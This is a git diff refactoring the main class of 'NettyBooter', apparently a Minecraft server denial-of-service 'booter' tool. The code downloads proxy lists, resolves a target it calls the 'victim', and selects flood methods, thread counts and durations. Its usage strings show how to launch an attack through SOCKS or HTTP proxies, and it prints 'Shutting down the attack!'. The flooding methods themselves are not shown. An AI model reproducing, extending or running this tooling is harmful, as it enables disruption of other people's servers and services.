@@ -7,6 +7,7 @@ import java.util.Scanner;
 
 import me.nzxtercode.nettybooter.methods.Methods;
 import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
+import me.nzxtercode.nettybooter.packets.Handshake;
 import me.nzxtercode.nettybooter.packets.ServerAddress;
 import me.nzxtercode.nettybooter.proxy.ProxyLoader;
 import me.nzxtercode.nettybooter.utils.LinuxColors;
@@ -18,6 +19,13 @@ import me.nzxtercode.nettybooter.utils.NettyBootstrap;
  */
 public class NettyBooter {
 
+	public static NettyBooter service;
+
+	private final static ProxyLoader proxyLoader = new ProxyLoader();
+	private final static Manager license = new Manager();
+	private final static ServerAddress serverAddress = new ServerAddress();
+
+	private static Methods methods;
 	/**
 	 * The constant threads.
 	 */
@@ -62,7 +70,7 @@ public class NettyBooter {
 	/**
 	 * The Rainbow.
 	 */
-	static final boolean RAINBOW = Boolean.parseBoolean(System.getProperty("R", "false"));
+	final static boolean RAINBOW = Boolean.parseBoolean(System.getProperty("r", "false"));
 
 	/**
 	 * The entry point of application.
@@ -70,10 +78,10 @@ public class NettyBooter {
 	 * @param args the input arguments
 	 * @throws Throwable the throwable
 	 */
-	public static void main(String[] args) throws Throwable {
+	 public static void main(String[] args) throws Throwable {
 		System.setOut(new PrintStream(System.out) {
 			public void println(String x) {
-				if (NettyBooter.RAINBOW && LinuxColors.SUPPORT) {
+				if (RAINBOW && LinuxColors.EMPTY.support) {
 					char[] arr = x.toCharArray();
 					StringBuilder sb = new StringBuilder();
 					byte b;
@@ -81,30 +89,30 @@ public class NettyBooter {
 					char[] arrayOfChar1;
 					for (i = (arrayOfChar1 = arr).length, b = 0; b < i;) {
 						char c = arrayOfChar1[b];
-						sb.append(LinuxColors.getRandomColor());
+						sb.append(LinuxColors.EMPTY.getRandomColor());
 						sb.append(c);
 						b++;
 					}
 					super.println(sb);
 					return;
 				}
-				super.println(LinuxColors.SUPPORT ? (LinuxColors.getRandomColor() + x) : x);
+				super.println(LinuxColors.EMPTY.support ? (LinuxColors.EMPTY.getRandomColor() + x) : x);
 			}
 		});
-		
-		Manager.start();
+
+		license.start();
 
 		if (args.length != 5 && args.length != 7) {
 			System.err.println("NettyBooter b7 v2 ALPHA by NZXTERCODE | https://dsc.gg/nzxterdc");
 			System.err.println();
 			System.err.println("java (-Dperdelay=2500 -Ddelay=1 -Drmnwp=false) -jar "
 					+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
-							.getName()
+					.getName()
 					+ " 0:25565 (Method-ID) (Thread-Count) (Protocol-Version) (Duration) [(ProxyFile) (Proxy-Type)]");
 			System.err
 					.println("java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar "
 							+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
-									.getName()
+							.getName()
 							+ " example.net/0:25565 1-7 5 47 60 socks4_proxies.txt http/socks4/socks5");
 			System.err.println();
 			System.err.println("Methods: 7");
@@ -124,7 +132,7 @@ public class NettyBooter {
 		if (cantParseInt(args[1]) || cantParseInt(args[2]) || cantParseInt(args[3]) || cantParseInt(args[4])) {
 			System.err.println("Usage: java (-Dperdelay=2500 -Ddelay=1 -Drmnwp=false) -jar "
 					+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
-							.getName()
+					.getName()
 					+ " 0:25565 (Method-ID) (Thread-Count) (Protocol-Version) (Duration) [(ProxyFile) (Proxy-Type)]");
 			return;
 		}
@@ -133,24 +141,24 @@ public class NettyBooter {
 					&& !args[6].equalsIgnoreCase("socks5")) {
 				System.err.println("Usage: java (-Dperdelay=2500 -Ddelay=1 -Drmnwp=false) -jar "
 						+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
-								.getName()
+						.getName()
 						+ " 0:25565 (Method-ID) (Thread-Count) (Protocol-Version) (Duration) [(ProxyFile) (Proxy-Type)]");
 				return;
 			}
 			if (!(new File(args[5])).exists()) {
 				System.err.println("The proxie file not exist");
 				System.err.println("Download proxies...");
-				ProxyLoader.load();
+				proxyLoader.load();
 				System.err.println("Downloaded!");
 				return;
 			}
 		}
 		try {
 			System.err.println("Download proxies...");
-			ProxyLoader.load();
+			proxyLoader.load();
 			System.err.println("Downloaded!");
 			System.out.println("Looking up the target address...");
-			ServerAddress sa = ServerAddress.getAddress(args[0]);
+			ServerAddress sa = serverAddress.getAddress(args[0]);
 			srvRecord = sa.getIP();
 			port = sa.getPort();
 			System.out.println("Found victim with " + srvRecord + ":" + port);
@@ -194,12 +202,12 @@ public class NettyBooter {
 					&& !msg.equals("close") && !msg.equals("c"));
 			scanner.close();
 			System.out.println(
-					LinuxColors.SUPPORT ? "\033[1;31mShutting down the attack!\nBB" : "Shutting down the attack!\nBB");
+					LinuxColors.EMPTY.support ? "\033[1;31mShutting down the attack!\nBB" : "Shutting down the attack!\nBB");
 			System.exit(0);
 		})).start();
-
-		Methods.init();
-		method = Methods.getByID(methodID);
+		methods = new Methods(new Handshake(NettyBooter.protocolID, NettyBooter.srvRecord, NettyBooter.port, 2));
+		methods.init();
+		method = methods.getByID(methodID);
 		new NettyBootstrap().start();
 	}
 
